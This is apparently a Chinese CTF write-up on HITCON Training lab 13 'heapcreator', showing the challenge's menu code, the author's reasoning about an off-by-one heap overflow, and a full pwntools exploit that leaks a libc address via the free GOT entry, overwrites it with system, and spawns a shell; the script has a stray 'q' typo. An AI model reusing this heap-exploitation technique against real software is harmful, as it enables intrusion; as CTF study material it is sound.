---
title: 巩固offbyone
date: 2022-03-21 14:22:14
tags:
    - 堆
    - pwn

---

<!--more-->

# heapcreator

通过hitcon training lab 13继续巩固offbyone 漏洞。

![image-20220321144455336](https://s2.loli.net/2022/03/27/EN7XCuKcALigtZJ.png)

就pie没开

## 菜单

```
int menu()
{
  puts("--------------------------------");
  puts("          Heap Creator          ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Show a Heap                 ");
  puts(" 4. Delete a Heap               ");
  puts(" 5. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
```

## create函数

![image-20220321150641343](https://s2.loli.net/2022/03/27/lyErFswdmgptzua.png)

没看出问题

## delete函数

![image-20220321150730194](https://s2.loli.net/2022/03/27/wJTypEPh5mi6YlD.png)

经验比较少，一开始误以为这里没有free   (*(&heaparray + v1) + 1)这个指针，后来一想这个if判断好像没问题

## show函数

![image-20220321151254618](https://s2.loli.net/2022/03/27/dk51aOsBjFxuYbf.png)

## edit函数

![image-20220321151402479](https://s2.loli.net/2022/03/27/KDkIPWfJ8yZYhoE.png)

## 思路

想法应该还是通过system(/bin/sh)打通，所以要去找能被system覆盖的函数，按照经验可以是free_hook函数，但是要求free_hook需要先计算libc偏移，计算libc偏移就需要show功能函数打印出来，需要被打印出的函数类似（puts,或者read……）覆盖堆上的指针，已知offbyone可以覆盖prev_size的情况下，可以构建一个伪堆块用我们需要的函数覆盖上面的指针。

## EXP

```
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level='debug'
#p=process('./heapcreator')
p=remote('node4.buuoj.cn',25917)
elf=ELF('./heapcreator')q
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def debug():
	gdb.attach(p)
def create(size,content):
	p.recvuntil('choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(content)
def edit(index,content):
	p.recvuntil('choice :')
	p.sendline('2')	
	p.recvuntil('Index :')
	p.sendline(str(index))
	p.recvuntil('Content of heap : ')
	p.sendline(content)
def show(index):
	p.recvuntil('choice :')
	p.sendline('3')	
	p.recvuntil('Index :')
	p.sendline(str(index))
def delete(index):
	p.recvuntil('choice :')
	p.sendline('4')		
	p.recvuntil('Index :')
	p.sendline(str(index))	
free_got=elf.got['free']
create(0x18,"aaaa")	#idx 0
create(0x10,"bbbb")	#idx 1
create(0x10,"cccc")	#idx 2
#通过edit修改heap[0]->content，覆盖保存heap[1]->content的chunk的size为0x81
edit(0,'/bin/sh\x00'+'a'*10+'\x81')
#又构建一个堆，用于弥补idx 1不足的0x70大小，里面存放free_got地址
create(0x70,'p'*0x10+p64(0)+p64(0x21)+p64(0x70)+p64(free_got))
show(1)
free_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))#打印地址
log.success('free_addr=>{}'.format(hex(free_addr)))
libc_base=free_addr-libc.sym['free']#计算libc偏移
system_addr=libc_base+libc.sym['system']
#payload='p'*0x10+p64(0)+p64(0x21)+p64(0x70)+p64(system_addr)
edit(1,p64(system_addr))#把idx 1里面free_got的指针指向覆盖为system（原本指向free_got的实际地址）
#debug()
delete(0)#free“/bin/sh”=system('/bin/sh')

p.interactive()
```

## 反思

​	我觉得这道题难点的是如何巧妙利用的堆，我其实一开始看出来了offbyone，但是不知道该如何去运用这个one字节，虽然也明白可以覆盖下一个堆块的prev_size大小，但是还是无从下手，感觉还得多练